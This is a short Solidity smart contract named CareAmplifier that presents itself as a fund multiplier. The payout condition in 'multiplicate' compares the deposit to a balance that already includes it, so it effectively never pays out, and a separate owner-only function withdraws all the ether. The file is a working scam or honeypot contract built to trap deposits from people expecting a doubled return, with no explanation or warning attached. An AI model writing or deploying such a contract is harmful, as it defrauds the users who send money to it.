pragma solidity ^0.4.18;

contract CareAmplifier
{
    address public Owner = msg.sender;

    function()payable{}

    function dischargeFunds()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.balance)
        {
            adr.transfer(this.balance+msg.value);
        }
    }
}